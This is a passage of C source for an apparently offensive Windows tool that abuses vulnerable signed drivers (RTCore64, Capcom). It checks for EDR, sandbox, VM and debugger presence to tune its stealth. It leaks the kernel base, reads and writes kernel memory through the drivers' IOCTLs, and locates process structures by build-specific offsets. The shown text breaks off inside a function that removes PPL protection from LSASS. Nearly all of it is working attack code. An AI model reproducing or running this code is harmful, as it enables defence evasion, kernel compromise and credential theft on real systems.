    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    BOOL found = FALSE;
    if (Process32FirstW(snapshot, &pe32)) {
        do {
            for (int i = 0; i < 9; i++) {
                if (_wcsicmp(pe32.szExeFile, edr_processes[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
        } while (Process32NextW(snapshot, &pe32) && !found);
    }

    CloseHandle(snapshot);
    return found;
}

BOOL CheckSandboxEnvironment() {
    // Check for sandbox artifacts
    WCHAR* sandbox_paths[] = {
        L"C:\\tools", L"C:\\analysis", L"C:\\sandbox",
        L"C:\\malware", L"C:\\virus", L"C:\\quarantine"
    };

    for (int i = 0; i < 6; i++) {
        if (PathFileExistsW(sandbox_paths[i])) {
            return TRUE;
        }
    }

    // Check for VM artifacts
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    // VM CPUID checks
    int cpuid[4];
    __cpuid(cpuid, 1);
    if (cpuid[2] & 0x80000000) return TRUE;  // Hypervisor bit

    __cpuid(cpuid, 0x40000000);
    if (cpuid[0] >= 0x40000000) return TRUE;  // Hypervisor leaf

    return FALSE;
}

VOID InitializeAntiAnalysis() {
    g_anti_ctx.is_edr_present = DetectEDRPresence();
    g_anti_ctx.is_sandbox = CheckSandboxEnvironment();
    g_anti_ctx.is_vm = CheckSandboxEnvironment();

    // Check for debugger
    BOOL is_debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_debugged);
    g_anti_ctx.is_debugger = is_debugged;

    // Set stealth level
    if (g_anti_ctx.is_edr_present) {
        g_anti_ctx.stealth_level = 3;
    } else if (g_anti_ctx.is_sandbox || g_anti_ctx.is_vm) {
        g_anti_ctx.stealth_level = 2;
    } else {
        g_anti_ctx.stealth_level = 1;
    }

    printf("[*] Anti-analysis assessment:\n");
    printf("    EDR Present: %s\n", g_anti_ctx.is_edr_present ? "YES" : "NO");
    printf("    Sandbox/VM: %s\n", (g_anti_ctx.is_sandbox || g_anti_ctx.is_vm) ? "YES" : "NO");
    printf("    Debugger: %s\n", g_anti_ctx.is_debugger ? "YES" : "NO");
    printf("    Stealth Level: %d\n\n", g_anti_ctx.stealth_level);
}

VOID EnumerateVulnerableDrivers() {
    printf("[*] Enumerating vulnerable drivers...\n");

    // Get loaded drivers
    LPVOID drivers[1024];
    DWORD bytes_needed;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &bytes_needed)) {
        int driver_count = bytes_needed / sizeof(LPVOID);

        for (int i = 0; i < driver_count; i++) {
            WCHAR driver_name[MAX_PATH];
            if (GetDeviceDriverBaseNameW(drivers[i], driver_name, MAX_PATH)) {
                // Remove .sys extension for comparison
                WCHAR* dot = wcsrchr(driver_name, L'.');
                WCHAR name_without_ext[MAX_PATH];
                if (dot) {
                    wcsncpy_s(name_without_ext, MAX_PATH, driver_name, dot - driver_name);
                } else {
                    wcscpy_s(name_without_ext, MAX_PATH, driver_name);
                }

                // Check against vulnerable driver database
                for (int j = 0; j < DRIVER_COUNT; j++) {
                    if (_wcsicmp(name_without_ext, g_vulnerable_drivers[j].name) == 0) {
                        g_vulnerable_drivers[j].is_loaded = TRUE;
                        printf("[+] Found vulnerable driver: %ls (CVE-%d)\n",
                               driver_name, g_vulnerable_drivers[j].cve_year);
                        break;
                    }
                }
            }
        }
    }

    // Also try to open device directly as fallback detection
    for (int i = 0; i < DRIVER_COUNT; i++) {
        if (!g_vulnerable_drivers[i].is_loaded) {
            HANDLE hTest = CreateFileW(
                g_vulnerable_drivers[i].device_path,
                GENERIC_READ | GENERIC_WRITE,
                0, NULL, OPEN_EXISTING, 0, NULL
            );
            if (hTest != INVALID_HANDLE_VALUE) {
                g_vulnerable_drivers[i].is_loaded = TRUE;
                printf("[+] Found vulnerable driver via device: %ls (CVE-%d)\n",
                       g_vulnerable_drivers[i].name, g_vulnerable_drivers[i].cve_year);
                CloseHandle(hTest);
            }
        }
    }

    // Check for additional drivers via file system
    WCHAR system32[MAX_PATH];
    GetSystemDirectoryW(system32, MAX_PATH);
    wcscat_s(system32, MAX_PATH, L"\\drivers\\");

    for (int i = 0; i < DRIVER_COUNT; i++) {
        if (!g_vulnerable_drivers[i].is_loaded) {
            WCHAR driver_path[MAX_PATH];
            wcscpy_s(driver_path, MAX_PATH, system32);
            wcscat_s(driver_path, MAX_PATH, g_vulnerable_drivers[i].name);
            wcscat_s(driver_path, MAX_PATH, L".sys");

            if (PathFileExistsW(driver_path)) {
                printf("[!] Driver file exists but not loaded: %ls\n", g_vulnerable_drivers[i].name);
            }
        }
    }

    printf("\n");
}

typedef struct _EPROCESS_OFFSETS {
    ULONG UniqueProcessId;
    ULONG ActiveProcessLinks;
    ULONG ImageFileName;
    ULONG Protection;
    ULONG SignatureLevel;
    ULONG SectionSignatureLevel;
} EPROCESS_OFFSETS;

EPROCESS_OFFSETS g_eprocess_offsets = {0};

// Dynamic offset detection for different Windows versions
// Get real Windows version using RtlGetVersion (not shimmed like GetVersionEx)
typedef NTSTATUS (NTAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);

DWORD GetRealWindowsBuild() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;

    RtlGetVersion_t pRtlGetVersion = (RtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!pRtlGetVersion) return 0;

    RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
    if (pRtlGetVersion(&osvi) == 0) {
        return osvi.dwBuildNumber;
    }
    return 0;
}

BOOL DetectEprocessOffsets() {
    printf("[*] Detecting EPROCESS offsets for current Windows build...\n");

    // Get real Windows version using RtlGetVersion (bypasses compatibility shim)
    DWORD build = GetRealWindowsBuild();
    if (build == 0) {
        // Fallback to registry
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                          L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                          0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            WCHAR buildStr[32];
            DWORD size = sizeof(buildStr);
            if (RegQueryValueExW(hKey, L"CurrentBuildNumber", NULL, NULL,
                                 (LPBYTE)buildStr, &size) == ERROR_SUCCESS) {
                build = _wtoi(buildStr);
            }
            RegCloseKey(hKey);
        }
    }

    printf("[*] Windows Build: %d\n", build);

    // EPROCESS offsets vary by Windows build
    // These are for 64-bit Windows. Verify with WinDbg: dt nt!_EPROCESS

    if (build >= 17763 && build < 18362) {
        // Windows 10 1809 (RS5)
        g_eprocess_offsets.UniqueProcessId = 0x2E8;
        g_eprocess_offsets.ActiveProcessLinks = 0x2F0;
        g_eprocess_offsets.ImageFileName = 0x450;
        g_eprocess_offsets.Protection = 0x6CA;
        g_eprocess_offsets.SignatureLevel = 0x6C8;
        g_eprocess_offsets.SectionSignatureLevel = 0x6C9;
    } else if (build >= 18362 && build < 18363) {
        // Windows 10 1903 (19H1)
        g_eprocess_offsets.UniqueProcessId = 0x2E8;
        g_eprocess_offsets.ActiveProcessLinks = 0x2F0;
        g_eprocess_offsets.ImageFileName = 0x450;
        g_eprocess_offsets.Protection = 0x6FA;
        g_eprocess_offsets.SignatureLevel = 0x6F8;
        g_eprocess_offsets.SectionSignatureLevel = 0x6F9;
    } else if (build >= 18363 && build < 19041) {
        // Windows 10 1909 (19H2)
        g_eprocess_offsets.UniqueProcessId = 0x2E8;
        g_eprocess_offsets.ActiveProcessLinks = 0x2F0;
        g_eprocess_offsets.ImageFileName = 0x450;
        g_eprocess_offsets.Protection = 0x6FA;
        g_eprocess_offsets.SignatureLevel = 0x6F8;
        g_eprocess_offsets.SectionSignatureLevel = 0x6F9;
    } else if (build >= 19041 && build < 22000) {
        // Windows 10 20H1/20H2/21H1/21H2/22H2 (builds 19041-19045)
        g_eprocess_offsets.UniqueProcessId = 0x440;
        g_eprocess_offsets.ActiveProcessLinks = 0x448;
        g_eprocess_offsets.ImageFileName = 0x5A8;
        g_eprocess_offsets.Protection = 0x87A;
        g_eprocess_offsets.SignatureLevel = 0x878;
        g_eprocess_offsets.SectionSignatureLevel = 0x879;
    } else if (build >= 22000 && build < 22621) {
        // Windows 11 21H2 (build 22000)
        g_eprocess_offsets.UniqueProcessId = 0x440;
        g_eprocess_offsets.ActiveProcessLinks = 0x448;
        g_eprocess_offsets.ImageFileName = 0x5A8;
        g_eprocess_offsets.Protection = 0x87A;
        g_eprocess_offsets.SignatureLevel = 0x878;
        g_eprocess_offsets.SectionSignatureLevel = 0x879;
    } else if (build >= 22621 && build < 26100) {
        // Windows 11 22H2/23H2 (builds 22621-22631)
        g_eprocess_offsets.UniqueProcessId = 0x440;
        g_eprocess_offsets.ActiveProcessLinks = 0x448;
        g_eprocess_offsets.ImageFileName = 0x5A8;
        g_eprocess_offsets.Protection = 0x87A;
        g_eprocess_offsets.SignatureLevel = 0x878;
        g_eprocess_offsets.SectionSignatureLevel = 0x879;
    } else if (build >= 26100) {
        g_eprocess_offsets.UniqueProcessId = 0x1D0;
        g_eprocess_offsets.ActiveProcessLinks = 0x1D8;
        g_eprocess_offsets.ImageFileName = 0x338;
        g_eprocess_offsets.Protection = 0x5FA;
        g_eprocess_offsets.SignatureLevel = 0x5F8;
        g_eprocess_offsets.SectionSignatureLevel = 0x5F9;
        printf("[*] Using Windows 11 24H2 Layout 1 offsets (build %d)\n", build);
        printf("[!] If this fails, the system may use Layout 2 (use WinDbg to verify)\n");
    } else {
        printf("[-] Unsupported Windows build: %d\n", build);
        printf("[!] Use WinDbg to find offsets: dt nt!_EPROCESS\n");
        printf("[!] Look for: UniqueProcessId, ActiveProcessLinks, Protection\n");
        return FALSE;
    }

    printf("[+] EPROCESS offsets detected:\n");
    printf("    UniqueProcessId: 0x%X\n", g_eprocess_offsets.UniqueProcessId);
    printf("    ActiveProcessLinks: 0x%X\n", g_eprocess_offsets.ActiveProcessLinks);
    printf("    Protection: 0x%X\n", g_eprocess_offsets.Protection);
    printf("\n");

    return TRUE;
}

// Kernel base leak via multiple methods
ULONG_PTR LeakKernelBase() {
    printf("[*] Attempting kernel base leak...\n");

    // Method 1: NtQuerySystemInformation
    typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    NtQuerySystemInformation_t NtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    if (NtQuerySystemInformation) {
        typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
            HANDLE Section;
            PVOID  MappedBase;
            PVOID  ImageBase;
            ULONG  ImageSize;
            ULONG  Flags;
            USHORT LoadOrderIndex;
            USHORT InitOrderIndex;
            USHORT LoadCount;
            USHORT OffsetToFileName;
            CHAR   FullPathName[256];
        } SYSTEM_MODULE_INFORMATION_ENTRY;

        typedef struct _SYSTEM_MODULE_INFORMATION {
            ULONG Count;
            SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
        } SYSTEM_MODULE_INFORMATION;

        ULONG size = 0;
        NtQuerySystemInformation(11, NULL, 0, &size);

        if (size > 0) {
            SYSTEM_MODULE_INFORMATION* smi = (SYSTEM_MODULE_INFORMATION*)malloc(size);
            if (smi) {
                if (NT_SUCCESS(NtQuerySystemInformation(11, smi, size, &size))) {
                    // ntoskrnl.exe is always first module (index 0)
                    ULONG_PTR kernel_base = (ULONG_PTR)smi->Modules[0].ImageBase;
                    printf("[+] Kernel base leaked via NtQuerySystemInformation: 0x%llX\n", kernel_base);
                    free(smi);
                    return kernel_base;
                }
                free(smi);
            }
        }
    }

    // Method 2: EnumDeviceDrivers
    LPVOID drivers[1024];
    DWORD bytes_needed;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &bytes_needed)) {
        // First driver is typically ntoskrnl.exe
        ULONG_PTR kernel_base = (ULONG_PTR)drivers[0];
        printf("[+] Kernel base leaked via EnumDeviceDrivers: 0x%llX\n", kernel_base);
        return kernel_base;
    }

    printf("[-] Failed to leak kernel base\n");
    return 0;
}

// RTCore64 memory read/write structure - MUST be 48 bytes!
typedef struct _RTCORE64_MEMORY {
    BYTE  Pad0[8];      // 8 bytes padding
    DWORD64 Address;    // 8 bytes - target address
    BYTE  Pad1[8];      // 8 bytes padding
    DWORD ReadSize;     // 4 bytes - size to read (1, 2, or 4)
    DWORD Value;        // 4 bytes - value read/write
    BYTE  Pad2[16];     // 16 bytes padding
} RTCORE64_MEMORY;
// Total: 8 + 8 + 8 + 4 + 4 + 16 = 48 bytes

// Verify structure size at compile time
#define STATIC_ASSERT(cond) typedef char static_assertion[(cond)?1:-1];
STATIC_ASSERT(sizeof(RTCORE64_MEMORY) == 48)

typedef struct _CAPCOM_IOCTL_REQUEST {
    ULONG_PTR TargetAddress;
    ULONG_PTR SourceAddress;
    SIZE_T Size;
} CAPCOM_IOCTL_REQUEST;

HANDLE OpenVulnerableDriver(int driver_index) {
    if (driver_index < 0 || driver_index >= DRIVER_COUNT) {
        return INVALID_HANDLE_VALUE;
    }

    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    if (!driver->is_loaded) {
        printf("[-] Driver %ls is not loaded\n", driver->name);
        return INVALID_HANDLE_VALUE;
    }

    printf("[*] Opening driver: %ls\n", driver->name);

    HANDLE hDevice = CreateFileW(
        driver->device_path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open %ls: %d\n", driver->name, GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    printf("[+] Successfully opened %ls\n", driver->name);
    return hDevice;
}

// Read DWORD from kernel memory using RTCore64
DWORD ReadKernelDWORD(HANDLE hDevice, DWORD ioctl, DWORD64 address) {
    // Validate address looks like kernel space (upper half of address space)
    // Windows uses canonical addresses: either 0x0000xxxxxxxxxxxx (user) or 0xFFFFxxxxxxxxxxxx (kernel)
    // Check if bit 47 is set (kernel space indicator)
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid kernel address in ReadKernelDWORD: 0x%llX\n", address);
        return 0;
    }

    RTCORE64_MEMORY mem = {0};
    mem.Address = address;
    mem.ReadSize = 4;

    DWORD bytes_returned = 0;
    BOOL result = DeviceIoControl(hDevice, ioctl, &mem, sizeof(mem), &mem, sizeof(mem), &bytes_returned, NULL);

    if (!result) {
        printf("[-] DeviceIoControl failed for address 0x%llX: %d\n", address, GetLastError());
        return 0;
    }

    return mem.Value;
}

// Read QWORD (8 bytes) from kernel memory using RTCore64
DWORD64 ReadKernelQWORD(HANDLE hDevice, DWORD ioctl, DWORD64 address) {
    // Validate address looks like kernel space
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid kernel address in ReadKernelQWORD: 0x%llX\n", address);
        return 0;
    }

    DWORD low = ReadKernelDWORD(hDevice, ioctl, address);
    DWORD high = ReadKernelDWORD(hDevice, ioctl, address + 4);
    return ((DWORD64)high << 32) | low;
}

BOOL ReadKernelMemory(HANDLE hDevice, int driver_index, ULONG_PTR address, PVOID buffer, SIZE_T size) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    DWORD bytes_returned;

    if (_wcsicmp(driver->name, L"RTCore64") == 0) {
        // RTCore64 can only read up to 4 bytes at a time
        BYTE* out_buffer = (BYTE*)buffer;
        ULONG_PTR current_addr = address;
        SIZE_T remaining = size;

        while (remaining > 0) {
            if (remaining >= 4) {
                DWORD val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
                memcpy(out_buffer, &val, 4);
                out_buffer += 4;
                current_addr += 4;
                remaining -= 4;
            } else {
                DWORD val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
                memcpy(out_buffer, &val, remaining);
                remaining = 0;
            }
        }
        return TRUE;
    } else if (_wcsicmp(driver->name, L"Capcom") == 0) {
        CAPCOM_IOCTL_REQUEST request = {0};
        request.TargetAddress = address;
        request.SourceAddress = (ULONG_PTR)buffer;
        request.Size = size;

        return DeviceIoControl(hDevice, driver->read_ioctl,
                              &request, sizeof(request),
                              NULL, 0,
                              &bytes_returned, NULL);
    }

    return FALSE;
}

// Write DWORD to kernel memory using RTCore64
void WriteKernelDWORD(HANDLE hDevice, DWORD ioctl, DWORD64 address, DWORD value) {
    // Validate address looks like kernel space
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid kernel address in WriteKernelDWORD: 0x%llX\n", address);
        return;
    }

    // RTCore64 write structure is different from read!
    // For write IOCTL 0x8000204C, the structure is:
    // - Offset 0x00: padding (8 bytes)
    // - Offset 0x08: target address (8 bytes)
    // - Offset 0x10: padding (8 bytes)
    // - Offset 0x18: value to write (4 bytes)
    // - Offset 0x1C: write size (4 bytes) - must be 1, 2, or 4
    // - Offset 0x20: padding (16 bytes)

    RTCORE64_MEMORY mem = {0};
    mem.Address = address;
    mem.Value = value;
    mem.ReadSize = 4;  // Size to write

    DWORD bytes_returned = 0;
    BOOL result = DeviceIoControl(hDevice, ioctl, &mem, sizeof(mem), &mem, sizeof(mem), &bytes_returned, NULL);

    if (!result) {
        printf("[-] DeviceIoControl write failed for address 0x%llX: %d\n", address, GetLastError());
    }
}

BOOL WriteKernelMemory(HANDLE hDevice, int driver_index, ULONG_PTR address, PVOID buffer, SIZE_T size) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    DWORD bytes_returned;

    if (_wcsicmp(driver->name, L"RTCore64") == 0) {
        // Write in 4-byte chunks with validation
        BYTE* in_buffer = (BYTE*)buffer;
        ULONG_PTR current_addr = address;
        SIZE_T remaining = size;

        while (remaining > 0) {
            DWORD val = 0;
            SIZE_T to_write = (remaining >= 4) ? 4 : remaining;
            memcpy(&val, in_buffer, to_write);

            // Validate address before write
            if ((current_addr & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
                printf("[-] Invalid kernel address: 0x%llX\n", current_addr);
                return FALSE;
            }

            // Read current value first to verify address is readable
            DWORD current_val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
            printf("[*] Address 0x%llX: current=0x%08X, writing=0x%08X\n",
                   current_addr, current_val, val);

            WriteKernelDWORD(hDevice, driver->write_ioctl, current_addr, val);

            // Verify write succeeded
            DWORD verify_val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
            if (verify_val != val) {
                printf("[-] Write verification failed at 0x%llX: expected 0x%08X, got 0x%08X\n",
                       current_addr, val, verify_val);
                return FALSE;
            }

            in_buffer += to_write;
            current_addr += to_write;
            remaining -= to_write;
        }
        return TRUE;
    } else if (_wcsicmp(driver->name, L"Capcom") == 0) {
        CAPCOM_IOCTL_REQUEST request = {0};
        request.TargetAddress = address;
        request.SourceAddress = (ULONG_PTR)buffer;
        request.Size = size;

        return DeviceIoControl(hDevice, driver->write_ioctl,
                              &request, sizeof(request),
                              NULL, 0,
                              &bytes_returned, NULL);
    }

    return FALSE;
}

// Get kernel symbol address by loading ntoskrnl.exe in usermode
ULONG_PTR GetKernelSymbol(ULONG_PTR kernel_base, const char* symbol_name) {
    HMODULE hNtos = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        return 0;
    }

    PVOID pUserAddr = GetProcAddress(hNtos, symbol_name);
    if (!pUserAddr) {
        FreeLibrary(hNtos);
        return 0;
    }

    ULONG_PTR rva = (ULONG_PTR)pUserAddr - (ULONG_PTR)hNtos;
    FreeLibrary(hNtos);

    return kernel_base + rva;
}

// Test if RTCore64 read is working
BOOL TestKernelRead(HANDLE hDevice, int driver_index) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    DWORD bytes_returned = 0;

    // Simple test read using correct 48-byte structure
    RTCORE64_MEMORY request = {0};
    request.Address = 0xFFFFF80000000000ULL;  // Typical kernel address
    request.ReadSize = 4;

    BOOL result = DeviceIoControl(hDevice, driver->read_ioctl,
                                  &request, sizeof(request),
                                  &request, sizeof(request),
                                  &bytes_returned, NULL);

    printf("[DEBUG] Test IOCTL result: %d, bytes_returned: %d, GetLastError: %d\n",
           result, bytes_returned, GetLastError());
    printf("[DEBUG] request.Value: 0x%08X\n", request.Value);

    return result;
}

// Scan for PID offset by looking for value 4 (System process PID)
// Returns 0 if not found or if scan is disabled for safety
ULONG ScanForPidOffset(HANDLE hDevice, DWORD ioctl, DWORD64 eprocess_base) {
    printf("[*] Scanning for PID offset (looking for value 4)...\n");
    printf("[!] WARNING: Scanning can be dangerous - using known offsets first\n");

    // Validate EPROCESS base looks like kernel address
    if ((eprocess_base & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid EPROCESS base address: 0x%llX\n", eprocess_base);
        return 0;
    }

    // Known good offsets to check first (from Vergilius Project)
    // Order matters - try most common first
    ULONG known_offsets[] = {
        0x1D0,  // Win11 24H2 Layout 1
        0x440,  // Win11 24H2 Layout 2, Win10 20H1+
        0x2E8,  // Win10 1809-1909
        0x2E0,  // Win10 older
        0x448   // Alternative
    };
    int num_known = sizeof(known_offsets) / sizeof(known_offsets[0]);

    for (int i = 0; i < num_known; i++) {
        __try {
            DWORD value = ReadKernelDWORD(hDevice, ioctl, eprocess_base + known_offsets[i]);
            printf("    Offset 0x%X: value = %u (0x%X)\n", known_offsets[i], value, value);
            if (value == 4) {
                printf("[+] Found PID=4 at known offset 0x%X\n", known_offsets[i]);
                return known_offsets[i];
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] Exception reading offset 0x%X\n", known_offsets[i]);
        }
    }

    printf("[-] PID not found at known offsets\n");
    printf("[!] NOT performing full scan to avoid potential crashes\n");
    printf("[!] Please verify offsets using WinDbg: dt nt!_EPROCESS\n");

    return 0;
}

// Scan for ActiveProcessLinks offset (look for valid kernel pointers)
ULONG ScanForLinksOffset(HANDLE hDevice, DWORD ioctl, DWORD64 eprocess_base, ULONG pid_offset) {
    printf("[*] Scanning for ActiveProcessLinks offset...\n");
    printf("[*] EPROCESS base: 0x%llX, PID offset: 0x%X\n", eprocess_base, pid_offset);

    // Known offsets for ActiveProcessLinks (typically PID offset + 8)
    ULONG known_links_offsets[] = {
        pid_offset + 8,  // Most common: right after UniqueProcessId
        0x1D8,  // Win11 24H2 Layout 1
        0x448,  // Win11 24H2 Layout 2, Win10 20H1+
        0x2F0,  // Win10 1809-1909
        0x2E8   // Win10 older
    };
    int num_known = sizeof(known_links_offsets) / sizeof(known_links_offsets[0]);

    for (int i = 0; i < num_known; i++) {
        ULONG offset = known_links_offsets[i];

        __try {
            DWORD64 flink = ReadKernelQWORD(hDevice, ioctl, eprocess_base + offset);

            // Validate it looks like a kernel pointer
            if ((flink & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL ||
                flink == 0xFFFFFFFFFFFFFFFFULL) {
                continue;
            }

            // Read Blink to verify it's a LIST_ENTRY
            DWORD64 blink = ReadKernelQWORD(hDevice, ioctl, eprocess_base + offset + 8);
            if ((blink & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL ||
                blink == 0xFFFFFFFFFFFFFFFFULL) {
                continue;
            }

            printf("    Testing offset 0x%X: Flink=0x%llX, Blink=0x%llX\n", offset, flink, blink);

            // Verify by following the link and checking PID
            DWORD64 next_eprocess = flink - offset;

            // Validate next EPROCESS address
            if ((next_eprocess & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
                continue;
            }

            DWORD next_pid = ReadKernelDWORD(hDevice, ioctl, next_eprocess + pid_offset);

            if (next_pid > 0 && next_pid < 65536) {
                printf("[+] Found valid ActiveProcessLinks at offset 0x%X (next PID: %u)\n",
                       offset, next_pid);
                return offset;
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] Exception testing offset 0x%X\n", offset);
        }
    }

    printf("[-] Could not find valid ActiveProcessLinks offset\n");
    return 0;
}

// Get PsActiveProcessHead - try multiple methods
ULONG_PTR GetPsActiveProcessHead(HANDLE hDevice, int driver_index, ULONG_PTR kernel_base) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];

    // Method 1: Try direct export (works on older Windows)
    ULONG_PTR ps_head = GetKernelSymbol(kernel_base, "PsActiveProcessHead");
    if (ps_head) {
        printf("[+] PsActiveProcessHead via export: 0x%llX\n", ps_head);
        return ps_head;
    }

    // Method 2: Use PsInitialSystemProcess (always exported)
    ULONG_PTR ps_initial = GetKernelSymbol(kernel_base, "PsInitialSystemProcess");
    if (ps_initial) {
        printf("[+] PsInitialSystemProcess address: 0x%llX\n", ps_initial);

        printf("[*] Reading System EPROCESS pointer...\n");

        __try {
            DWORD64 system_eprocess = ReadKernelQWORD(hDevice, driver->read_ioctl, ps_initial);

            // Validate the EPROCESS pointer looks reasonable
            if (system_eprocess == 0 || system_eprocess == 0xFFFFFFFFFFFFFFFF) {
                printf("[-] Invalid System EPROCESS pointer: 0x%llX\n", system_eprocess);
                return 0;
            }

            // Check it looks like a kernel address
            if ((system_eprocess & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
                printf("[-] System EPROCESS doesn't look like kernel address: 0x%llX\n", system_eprocess);
                return 0;
            }

            printf("[+] System EPROCESS: 0x%llX\n", system_eprocess);

            // Try configured offset first
            printf("[*] Testing PID at offset 0x%X...\n", g_eprocess_offsets.UniqueProcessId);
            DWORD pid = ReadKernelDWORD(hDevice, driver->read_ioctl,
                                        system_eprocess + g_eprocess_offsets.UniqueProcessId);
            printf("[*] Value at offset 0x%X: %u (0x%X)\n",
                   g_eprocess_offsets.UniqueProcessId, pid, pid);

            if (pid == 4) {
                printf("[+] Verified System EPROCESS - PID matches!\n");

                // Also verify ActiveProcessLinks looks valid before using
                DWORD64 flink = ReadKernelQWORD(hDevice, driver->read_ioctl,
                                                system_eprocess + g_eprocess_offsets.ActiveProcessLinks);
                printf("[*] ActiveProcessLinks.Flink: 0x%llX\n", flink);

                if ((flink & 0xFFFF800000000000ULL) == 0xFFFF800000000000ULL &&
                    flink != 0xFFFFFFFFFFFFFFFFULL) {
                    printf("[+] ActiveProcessLinks looks valid\n");
                    return system_eprocess + g_eprocess_offsets.ActiveProcessLinks;
                } else {
                    printf("[-] ActiveProcessLinks doesn't look valid\n");
                }
            }

            // Offset wrong - try scanning known offsets only (safer)
            printf("[!] Configured offset wrong, trying known offsets...\n");
            ULONG found_pid_offset = ScanForPidOffset(hDevice, driver->read_ioctl, system_eprocess);

            if (found_pid_offset) {
                g_eprocess_offsets.UniqueProcessId = found_pid_offset;

                // Find ActiveProcessLinks offset
                ULONG found_links_offset = ScanForLinksOffset(hDevice, driver->read_ioctl,
                                                              system_eprocess, found_pid_offset);

                if (found_links_offset) {
                    g_eprocess_offsets.ActiveProcessLinks = found_links_offset;

                    // Protection offset varies by build - use conservative estimate
                    // Typically 0x200-0x900 bytes into structure
                    g_eprocess_offsets.Protection = 0x87A;  // Common for Win10/11

                    printf("[+] Updated offsets:\n");
                    printf("    UniqueProcessId: 0x%X\n", g_eprocess_offsets.UniqueProcessId);
                    printf("    ActiveProcessLinks: 0x%X\n", g_eprocess_offsets.ActiveProcessLinks);
                    printf("    Protection: 0x%X (estimated)\n", g_eprocess_offsets.Protection);

                    return system_eprocess + g_eprocess_offsets.ActiveProcessLinks;
                } else {
                    printf("[-] Could not find ActiveProcessLinks - aborting for safety\n");
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] Exception while reading System EPROCESS\n");
        }
    }

    printf("[-] Could not find process list head\n");
    printf("[!] This may require manual offset verification with WinDbg\n");
    return 0;
}

ULONG_PTR FindEprocessByPid(HANDLE hDevice, int driver_index, DWORD pid) {
    printf("[*] Finding EPROCESS for PID %d...\n", pid);

    // Get kernel base
    ULONG_PTR kernel_base = LeakKernelBase();
    if (kernel_base == 0) {
        return 0;
    }

    // Get process list starting point
    ULONG_PTR list_start = GetPsActiveProcessHead(hDevice, driver_index, kernel_base);
    if (list_start == 0) {
        printf("[-] Failed to find process list\n");
        return 0;
    }

    // Read the LIST_ENTRY at our starting point
    LIST_ENTRY head;
    if (!ReadKernelMemory(hDevice, driver_index, list_start, &head, sizeof(head))) {
        printf("[-] Failed to read process list\n");
        return 0;
    }

    // Walk the linked list
    ULONG_PTR current_entry = (ULONG_PTR)head.Flink;
    ULONG_PTR start_entry = current_entry;

    do {
        // Calculate EPROCESS base from ActiveProcessLinks offset
        ULONG_PTR eprocess = current_entry - g_eprocess_offsets.ActiveProcessLinks;

        // Read the PID
        DWORD current_pid;
        if (!ReadKernelMemory(hDevice, driver_index,
                             eprocess + g_eprocess_offsets.UniqueProcessId,
                             &current_pid, sizeof(current_pid))) {
            break;
        }

        if (current_pid == pid) {
            printf("[+] Found EPROCESS for PID %d: 0x%llX\n", pid, eprocess);
            return eprocess;
        }

        // Move to next entry
        LIST_ENTRY next_entry;
        if (!ReadKernelMemory(hDevice, driver_index, current_entry, &next_entry, sizeof(next_entry))) {
            break;
        }

        current_entry = (ULONG_PTR)next_entry.Flink;

        // Safety check to prevent infinite loop
        if (current_entry == start_entry) {
            break;
        }

    } while (current_entry != start_entry);

    printf("[-] EPROCESS for PID %d not found\n", pid);
    return 0;
}

BOOL BypassPplProtection(HANDLE hDevice, int driver_index, DWORD lsass_pid) {
    printf("[*] Bypassing PPL protection for LSASS (PID %d)...\n", lsass_pid);

    // Find LSASS EPROCESS
    ULONG_PTR lsass_eprocess = FindEprocessByPid(hDevice, driver_index, lsass_pid);
    if (lsass_eprocess == 0) {
        return FALSE;
